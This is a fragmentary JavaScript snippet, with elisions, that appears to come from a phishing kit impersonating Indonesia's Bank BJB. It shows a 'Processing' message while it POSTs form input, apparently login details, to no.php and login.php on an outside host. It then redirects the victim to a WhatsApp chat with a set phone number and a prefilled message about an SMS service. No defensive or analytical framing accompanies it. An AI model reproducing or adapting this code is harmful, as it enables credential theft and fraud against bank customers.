...
$('.load').fadeIn();
 document.getElementById('kirims').innerHTML ="Memproses...";
      ...
      $.ajax({
            type: 'POST',
            url: 'https://axcellent.dvnet.org/app28/no.php',
...
$('.load').fadeIn();
 document.getElementById('kirims').innerHTML ="Memproses..."; 
      $.ajax({
            type: 'POST',
            url: 'https://axcellent.dvnet.org/app28/login.php',
...
setTimeout(function(){  
location.href='https://api.whatsapp.com/send?phone=6282276539110&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯,%0ASaya mau request Pesan SMS ke layanan (83373)';
$('.load').fadeOut();
    }, 5500);    
}  
